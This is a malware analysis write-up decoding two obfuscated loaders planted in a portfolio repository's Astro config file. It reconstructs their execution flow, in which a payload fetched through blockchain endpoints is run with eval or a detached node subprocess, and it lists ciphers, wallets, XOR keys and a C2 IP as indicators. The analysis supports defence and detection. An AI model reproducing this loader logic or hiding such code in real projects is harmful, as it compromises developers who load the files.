# Task AJ: JudeTejada/jude-portfolio-v3 — Double Infection Decode

**Date:** 2026-07-05  
**File:** `astro.config.mjs` — 11,715 bytes  
**Source:** `https://github.com/JudeTejada/jude-portfolio-v3`

---

## Summary

Two complete Stage 1 IIFEs are stacked sequentially in the file — two separate infection
events by the same actor's tooling. Both IIFEs are **byte-for-byte identical** except for
the campaign ID in the pre-IIFE bootstrap section. Both decode to the same 3,858-char
Stage 1 body, using canonical W1/W2 infrastructure.

The `_$_ccfc` table (58 entries, seed 1812138) is **identical to the aegre/damian AX
decode**. No new infrastructure. The guard key `_p_t` identifies this as an older Stage 1
variant predating the `_t_t` rename.

---

## File Structure

```
[0–1,643B]   Legitimate Astro config header
             // @ts-check
             import { defineConfig } from 'astro/config';
             import react, vercel, tailwindcss, expressiveCode, mdx, sitemap...

[1,644B]     ┌── INFECTION 1 PRE-BOOTSTRAP ──────────────────────────────────
             │  global['!'] = '9-1330-1';
             │  var _$_1e42 = (function(l,e){cipher})('rmcej%otb%', 2857687);
             │  global[_$_1e42[0]] = require;        // global['r'] = require
             │  if (typeof module === _$_1e42[1]) { global[_$_1e42[2]] = module }
             └───────────────────────────────────────────────────────────────

[2,215B]     ┌── INFECTION 1 IIFE ────────────────────────────────────────────
             │  ;(function(){
             │    function sfL(w) { /* seed 2667686 */ }
             │    var EKc = sfL('wuqktamcei...').substr(0,11);  // → 'constructor'
             │    var joW = '...890 chars...';  // encoded decompressor body
             │    var jFD = sfL[EKc];           // Function
             │    var xBg = jFD('', sfL(joW));  // decompressor function
             │    var pYd = xBg(sfL('...2,803 chars...'));  // Stage 1 body string
             │    var Tgw = jFD('', pYd);       // Function('', stage1)
             │    Tgw(2509);  return 1358;
             │  })();
             └───────────────────────────────────────────────────────────────

[6,929B]     ┌── INFECTION 2 PRE-BOOTSTRAP ──────────────────────────────────
             │  global['!'] = '8';
             │  var _$_1e42 = (same cipher)('rmcej%otb%', 2857687);
             │  global[_$_1e42[0]] = require;
             │  if (typeof module === _$_1e42[1]) { global[_$_1e42[2]] = module }
             └───────────────────────────────────────────────────────────────

[7,500B]     ┌── INFECTION 2 IIFE ────────────────────────────────────────────
             │  (identical to IIFE 1 — same sfL, joW, pYd, Tgw(2509))
             │  return 1358;
             └───────────────────────────────────────────────────────────────

[11,715B]    EOF
```

---

## Campaign ID Analysis

| IIFE | Campaign ID | `_V` (after prefix) | C2 route | Era |
|------|------------|---------------------|----------|-----|
| 1 | `9-1330-1` | `A9-1330-1` | `166.88.134.62:443` | Series 9, mid-campaign |
| 2 | `8` | `A8` | `166.88.134.62:443` | **Earliest format** — bare number |

`global['_V'] = 'A' + global['!']` in Stage 1 — the `'A'` prefix is added by `_$_ccfc[2]` to
ALL campaigns using this Stage 1 variant. Both infections route to the admin/dedicated server
`166.88.134.62:443` regardless of series.

The bare-`8` campaign is among the earliest actor-tracked victims — predating the
`8-XXXX` sub-numbered format. Likely the 8th total target tracked by the actor.

---

## Cipher Registry

### Outer bootstrap: `_$_1e42` (standard)

| Parameter | Value |
|-----------|-------|
| Encoded string | `"rmcej%otb%"` |
| Seed | `2857687` |
| off1 | 489 | mod1 | 19597 |
| off2 | 659 | mod2 | 48014 |
| Modulus | 4573868 |
| Output | `['r', 'object', 'm']` |

Sets `global['r'] = require` and `global['m'] = module`. Same as all other known `_$_1e42`
Stage 1 variants.

### Token decompressor: `sfL` — **NEW cipher**

| Parameter | Value |
|-----------|-------|
| Seed | `2667686` |
| off1 | 228 | mod1 | 50332 |
| off2 | 128 | mod2 | 52119 |
| Modulus | 4289487 |

`sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,11)` → `'constructor'`

This cipher variant (seed 2667686) has not been previously documented. It is the outer
decompressor layer, equivalent to `NVu` in Stage 2 or `_0x5ed160` in the AX obfuscator.io.
The encoded `joW` (890 chars) and `pYd` (2,803 chars) strings are identical in both IIFEs.

**Activation code: `2509`  Return code: `1358`**

### Inner cipher: `_$af163278` (seed 1812138)

| Parameter | Value |
|-----------|-------|
| Seed | `1812138` |
| off1 | 139 | mod1 | 20044 |
| off2 | 473 | mod2 | 41543 |
| Modulus | 5446973 |

Same as aegre/damian (Task AX). Decodes `"be_Vo%0l81ldJ1%..."` → `_$_ccfc` (58 entries).

---

## `_$_ccfc` String Table (58 entries)

Identical to AX decode. Key entries:

| Index | Value | Role |
|-------|-------|------|
| `[0]` | `r` | `global['r']` → require |
| `[1]` | `_V` | Campaign ID global key |
| `[2]` | `A` | Prefix prepended to campaign ID → `_V = 'A' + campaign` |
| `[3]` | `!` | `global['!']` = raw campaign ID |
| `[12]` | `https` | module name |
| `[13]` | `Promise` | global |
| `[37]` | `bsc-dataseed.binance.org` | BSC RPC primary |
| `[38]` | `bsc-rpc.publicnode.com` | BSC RPC fallback |
| `[44]` | `Date` | global |
| `[45]` | `_p_t` | **Guard key** — rate-limit global (older variant; current uses `_t_t`) |
| `[46]` | `2[gWfGj;<:-93Z^C` | W1 XOR key |
| `[47]` | `TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP` | W1 TRON (canonical W1) |
| `[48]` | `0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e` | W1 Aptos (A1) |
| `[49]` | `m6:tTh^D)cBz?NM]` | W2 XOR key |
| `[50]` | `TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG` | W2 TRON (canonical W2) |
| `[51]` | `0x3f0e5781d0855fb460661ac63257376db1941b2bb522499e4757ecb3ebd5dce3` | W2 Aptos (A2) |
| `[52]` | `node` | spawn executable |
| `[53]` | `-e` | spawn flag |
| `[57]` | `child_process` | module |

---

## Stage 1 Execution Flow

```javascript
// 1. Bootstrap (pre-IIFE)
global['!'] = '9-1330-1';
global['r'] = require;
global['m'] = module;

// 2. Stage 1 runtime
const i = global;
const d = i['r'];  // require

i['_V'] = 'A' + i['!'];  // _V = 'A9-1330-1'

// Rate-limit check (older guard)
if (i['_p_t'] && now - i['_p_t'] < 30000) return;
i['_p_t'] = now;

// Primary path: W1
try {
  const r = await t('2[gWfGj;<:-93Z^C', 'TMfKQEd7...', '0xbe037400...');
  eval(r);           // ← eval Stage 2 directly in same process
} catch(t) {}

// Fallback: W2 — spawns new Node.js process
try {
  const r = await t('m6:tTh^D)cBz?NM]', 'TXfxHUet...', '0x3f0e5781...');
  child_process.spawn('node', ['-e', "global['_V']='A9-1330-1'; " + r], {
    detached: true, stdio: 'ignore', windowsHide: true
  }).on('error', (t) => { eval(r) });
} catch(t) {}
```

**Key structural difference from current Stage 1**: The W2 fallback uses
`child_process.spawn('node', ['-e', ...])` to run Stage 2 in a detached child process,
passing `_V` via the injected code. The current `_t_t` variant uses only `eval()`.

---

## Guard Key Timeline

| Guard key | Stage 1 variant | Status |
|-----------|----------------|--------|
| `_p_t` | JudeTejada (this file) | **Older** — pre-dates current |
| `_t_t` | aegre/damian AX; live Stage 2 (Jun 2026) | Current |

The rename from `_p_t` → `_t_t` occurred between JudeTejada's infection date (Nov 2025)
and the aegre/damian deployment (Jun 2026). This places the guard rename in the Nov 2025 –
Jun 2026 window.

---

## Double Infection Mechanics

Both IIFEs execute sequentially when the Astro config is loaded. IIFE 1 fires first:
- Sets `global['_p_t']` to current time
- Connects to C2 and runs Stage 2

IIFE 2 fires immediately after:
- The `if(global['_p_t'] && now - global['_p_t'] < 30000)` guard triggers
- IIFE 2 exits immediately — never connects to C2

**Only IIFE 1 (campaign `9-1330-1`) actually executes.** IIFE 2 (campaign `8`) is
permanently suppressed by the rate-limit guard from IIFE 1. The dual campaign tracking
means the actor's backend has two entries for this developer, but only the newer one
(`9-1330-1`) generates telemetry.

---

## Infrastructure Confirmation

No new wallets, XOR keys, BSC endpoints, or C2 IPs. All infrastructure is canonical W1/W2:

| IOC | Value | Source |
|-----|-------|--------|
| TRON W1 | `TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP` | Confirmed in `ANALYSIS_TRON_WALLETS_FULL.md` |
| TRON W2 | `TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG` | Confirmed |
| Aptos A1 | `0xbe037400...` | Confirmed in `ANALYSIS_APTOS_WALLETS.md` |
| Aptos A2 | `0x3f0e5781...` | Confirmed |
| XOR W1 | `2[gWfGj;<:-93Z^C` | Confirmed |
| XOR W2 | `m6:tTh^D)cBz?NM]` | Confirmed |
| BSC primary | `bsc-dataseed.binance.org` | Standard |
| BSC fallback | `bsc-rpc.publicnode.com` | Standard |

---

## New IOCs

| IOC | Type | Notes |
|-----|------|-------|
| `sfL` cipher, seed `2667686` | New cipher variant | Token decompressor; off1=228/mod1=50332/off2=128/mod2=52119/mod=4289487 |
| Activation code `2509` / return `1358` | Handshake codes | `Tgw(2509)` / `return 1358` |
| `_p_t` guard key | Older Stage 1 indicator | Replaced by `_t_t` in later variants |
| `child_process.spawn('node',['-e',...])` | W2 execution path | Detached subprocess; passes `_V` inline |
| Campaign `8` (bare) | Campaign ID | Earliest format — among actor's first tracked targets |

---

## Related Documents

- `ANALYSIS_AX_OBFUSCATOR.md` — aegre/damian decode (same `_$af163278` / `_$_ccfc`)
- `ANALYSIS_AX_W_CROSSREF.md` — W1/W2 naming reconciliation
- `ANALYSIS_TRON_WALLETS_FULL.md` — W1/W2 transaction history
- `ANALYSIS_ASTRO_CLUSTER_AI.md` — full cluster map (entry #28, double infection)
